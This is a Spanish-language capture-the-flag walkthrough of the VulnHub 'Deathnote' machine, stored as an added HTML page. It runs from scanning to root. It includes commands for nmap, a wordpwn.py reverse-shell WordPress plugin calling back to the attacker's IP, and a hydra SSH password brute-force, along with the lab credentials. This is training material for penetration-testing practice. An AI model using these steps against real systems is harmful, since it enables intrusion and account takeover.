@@ -1,0 +1,201 @@
+I"+-<p><a href="https://www.vulnhub.com/entry/deathnote-1,739/">https://www.vulnhub.com/entry/deathnote-1,739/</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.1.0/24
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/1.png" alt="image-center" class="align-center" /></p>
+
+<p>Saldrá una IP con los puertos 80 y 22 abiertos</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/2.png" alt="image-center" class="align-center" /></p>
+
+<p>Al intentar entrar a la web saldrá un mensaje que dice Please wait y se redireccionará a una web de wordpress.</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/3.png" alt="image-center" class="align-center" /></p>
+
+<p>Realizar un escaneo de todos los directorios del sitio con gobuster</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/4.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a <code class="language-plaintext highlighter-rouge">/robots.txt</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/5.png" alt="image-center" class="align-center" />
+<img src="http://localhost:4000/assets/images/vulnhub/deathnote/6.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a <code class="language-plaintext highlighter-rouge">/important.jpg</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/7.png" alt="image-center" class="align-center" /></p>
+
+<p>Dirá que la imagen no se puede cargar por contener errores así que procedemos a descargar ese archivo a nuestro equipo usando <code class="language-plaintext highlighter-rouge">wget</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/8.png" alt="image-center" class="align-center" /></p>
+
+<p>Comprobar que el archivo es realmente una imagen en jpg</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/9.png" alt="image-center" class="align-center" /></p>
+
+<p>Dirá que realmente es un documento de texto al que se le ha cambiado el nombre para hacer parecer que es una imagen.</p>
+
+<p>Leer el archivo <code class="language-plaintext highlighter-rouge">important.jpg</code>, no es necesario cambiar su extensión para que cat lo reconozca.</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/10.png" alt="image-center" class="align-center" /></p>
+
+<p>Dirá que miremos en <code class="language-plaintext highlighter-rouge">/user.txt</code>, tambien que la contraseña puede estar en el lugar de la pista</p>
+
+<p>Entrar a la web y darle click al Hint</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/11.png" alt="image-center" class="align-center" /></p>
+
+<p>Dirá que busquemos un archivo llamado <code class="language-plaintext highlighter-rouge">notes.txt</code> en el servidor o leamos el comentario de L</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/12.png" alt="image-center" class="align-center" /></p>
+
+<p>Mirar el comentario de L</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/13.png" alt="image-center" class="align-center" /></p>
+
+<p>Probar a acceder desde el login con el usuario Kira y la contraseña iamjustic3</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/14.png" alt="image-center" class="align-center" /></p>
+
+<p>Dará acceso al panel de administrador de Wordpress</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/15.png" alt="image-center" class="align-center" /></p>
+
+<p>Probar a entrar al editor de temas para modificar el de 404, mostrará que no es posible</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/16.png" alt="image-center" class="align-center" /></p>
+
+<p>Utilizar <code class="language-plaintext highlighter-rouge">malicious-wordpress-plugin</code> para crear un plugin que abrirá un shell inverso</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python wordpwn.py 192.168.122.5 4444 Y
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/17.png" alt="image-center" class="align-center" /></p>
+
+<p>Quedará en el puerto de escucha y se generará un archivo zip que será el plugin</p>
+
+<p>Subir el plugin al sitio de wordpress</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/18.png" alt="image-center" class="align-center" />
+<img src="http://localhost:4000/assets/images/vulnhub/deathnote/19.png" alt="image-center" class="align-center" /></p>
+
+<p>Activar el plugin</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/20.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al editor de plugins y seleccionar GotEm</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/21.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a la ruta del plugin</p>
+
+<p>http://192.168.122.7/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php</p>
+
+<p>Se abrirá un shell inverso con meterpreter</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/22.png" alt="image-center" class="align-center" /></p>
+
+<p>Entrar en modo shell con el comando <code class="language-plaintext highlighter-rouge">shell</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/21.png" alt="image-center" class="align-center" /></p>
+
+<p>Comprobar que el usuario es <code class="language-plaintext highlighter-rouge">www-data</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/22.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio home y mostrar contenido para ver los usuarios, se mostraran el usuario kira y el usuario l</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/23.png" alt="image-center" class="align-center" /></p>
+
+<p>Entrar en el directorio de kira, mostrar el contenido e intentar leer el archivo <code class="language-plaintext highlighter-rouge">kira.txt</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/24.png" alt="image-center" class="align-center" /></p>
+
+<p>Volver atrás e intentar lo mismo en el directorio de <code class="language-plaintext highlighter-rouge">l</code>, mostrar el contenido de <code class="language-plaintext highlighter-rouge">user.txt</code>, mostrará un texto cifrado en Brainfuck</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/25.png" alt="image-center" class="align-center" /></p>
+
+<p>Descifrar el mensaje usando la web de dcode.fr, mostrará el mensaje “i think u got the shell, but you wont be able to kill me -kira”</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/26.png" alt="image-center" class="align-center" /></p>
+
+<p>Volver al panel de wordpress e investigar más, en la sección de media se encontrará el archivo <code class="language-plaintext highlighter-rouge">notes.txt</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/27.png" alt="image-center" class="align-center" /></p>
+
+<p>Parece ser un diccionario de posibles claves, descargarlo</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/28.png" alt="image-center" class="align-center" /></p>
+
+<p>Usar <code class="language-plaintext highlighter-rouge">hydra</code> para encontrar cuál de las contraseñas es del usuario L en <code class="language-plaintext highlighter-rouge">ssh</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hydra <span class="nt">-t</span> 4 <span class="nt">-l</span> l <span class="nt">-P</span> Downloads/notes.txt 192.168.122.7 ssh
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/29.png" alt="image-center" class="align-center" /></p>
+
+<p>Usuario: l
+Contraseña: death4me</p>
+
+<p>Entrar por <code class="language-plaintext highlighter-rouge">ssh</code> con el usuario l y la contraseña death4me</p>
+
+<p>Ir al directorio <code class="language-plaintext highlighter-rouge">/opt</code> y mostrar el contenido</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/30.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio y mostrar el contenido</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/31.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio <code class="language-plaintext highlighter-rouge">fake-notebook-rule/</code> y mostrar el contenido, el archivo <code class="language-plaintext highlighter-rouge">hint</code> dirá que se use cyberchef aunque no es necesario</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/32.png" alt="image-center" class="align-center" /></p>
+
+<p>Comprobar el tipo de archivo de <code class="language-plaintext highlighter-rouge">case.wav</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/33.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el archivo <code class="language-plaintext highlighter-rouge">case.wav</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/34.png" alt="image-center" class="align-center" /></p>
+
+<p>Usar dcode.fr para descifrar el contenido</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/35.png" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/36.png" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/37.png" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/38.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio <code class="language-plaintext highlighter-rouge">kira-case/</code>, el archivo case-file.txt no mostrará nada relevante</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/39.png" alt="image-center" class="align-center" /></p>
+
+<p>Cambiar al usuario kira con la contraseña del mensaje cifrado anterior</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/40.png" alt="image-center" class="align-center" /></p>
+
+<p>Mostrar que permisos tiene el usuario con el comando</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
+
+<p>Mostrará que puede ejecutar todo, esto significa que puede cambiar a usuario root sin necesidad de introducir contraseña</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/41.png" alt="image-center" class="align-center" /></p>
+
+<p>Cambiar al usuario root</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/42.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio de root y mostrar el contenido</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/43.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el contenido de <code class="language-plaintext highlighter-rouge">root.txt</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/44.png" alt="image-center" class="align-center" /></p>
+:ET
